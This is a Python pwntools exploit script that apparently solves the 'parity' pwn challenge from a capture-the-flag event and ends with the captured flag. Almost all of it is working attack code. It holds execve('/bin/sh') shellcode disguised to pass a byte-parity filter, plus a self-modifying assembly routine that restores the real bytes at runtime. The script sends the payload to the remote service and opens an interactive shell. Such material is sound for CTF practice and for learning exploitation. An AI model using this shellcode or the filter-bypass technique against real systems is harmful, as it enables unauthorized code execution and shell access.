#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template parity
from pwn import *

HOST, PORT = "challs.actf.co 31226".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('parity')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# break *(main+203)
break *(main+255)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# original_shellcode = (
#     b"\x48\x31\xf6"    # xor    %rsi,%rsi
#     b"\x56"            # push   %rsi
#     b"\x48\xbf\x2f\x62\x69\x6e\x2f" # movabs $0x68732f2f6e69622f,%rdi
#     b"\x2f\x73\x68"
#     b"\x57"                   	# push   %rdi
#     b"\x54"                   	# push   %rsp
#     b"\x5f"                   	# pop    %rdi
#     b"\x6a\x3b"                	# pushq  $0x3b
#     b"\x58"                   	# pop    %rax
#     b"\x99"                   	# cltd
#     b"\x0f\x05"                	# syscall ,
# )

original_shellcode = (
    b"\x57"               # pop rdi
    b"\x48\x31\xf6"    # xor    %rsi,%rsi
    b"\x55"            # push   %rsi                                        -1
    b"\x90"
    b"\x47"             # -1
    b"\xbe"             # -1
    b"\x2f"
    b"\x62"
    b"\x69"
    b"\x6e"
    b"\x2f" # movabs $0x68732f2f6e69622f,%rdi
    b"\x72"     # -1
    b"\x67"     # -1
    b"\x00"
    b"\x57"                   	# push   %rdi
    b"\x54"                   	# push   %rsp
    b"\x5f"                   	# pop    %rdi
    b"\x6a\x3b"                	# pushq  $0x3b
    b"\x58"                   	# pop    %rax
    b"\x99"                   	# cltd
    b"\x0e"     # -1
    b"\x05"                	# syscall ,
)
# this is the routine that will increment the one byte of original shellcode
shellcode = ( 
    "add rsi, 53",
    "add rsi, 53",
    "add rsi, 53",
    "add rsi, 5",
    "add rsi, 7",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "mov eax, dword ptr [rsi]", # \x55 -> \x56
    "pop rdi",
    "add rax, 1",
    "nop",
    "mov dword ptr [rsi], eax",
    "push rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "mov eax, dword ptr [rsi]", # \x47 -> \x48
    "pop rdi",
    "add rax, 1",
    "nop",
    "mov dword ptr [rsi], eax",
    "push rdi",
    "inc rsi",
    "mov eax, dword ptr [rsi]", # \xbe -> \xbf
    "pop rdi",
    "add rax, 1",
    "nop",
    "mov dword ptr [rsi], eax",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "mov eax, dword ptr [rsi]", # \x72 -> \x73
    "pop rdi",
    "add rax, 1",
    "nop",
    "mov dword ptr [rsi], eax",
    "push rdi",
    "inc rsi",
    "mov eax, dword ptr [rsi]", # \x67 -> \x68
    "pop rdi",
    "add rax, 1",
    "nop",
    "mov dword ptr [rsi], eax",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "push rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "pop rdi",
    "inc rsi",
    "mov eax, dword ptr [rsi]", # \x67 -> \x68
    "pop rdi",
    "add rax, 1",
    "nop",
    "mov dword ptr [rsi], eax",
)
shellcode = list(asm(_) for _ in shellcode)
print("shellcode:", shellcode)
print("length of shellcode:", len(b"".join(shellcode)))
final_shellcode = b""
final_shellcode += b"".join(shellcode)
final_shellcode += original_shellcode
print("bad character:", final_shellcode[0xa8])
print(final_shellcode)
print(disasm(final_shellcode))
io.sendafter(b"> ", final_shellcode)

io.interactive()

# actf{f3els_like_wa1king_down_4_landsl1de_6d28d72fd7db}
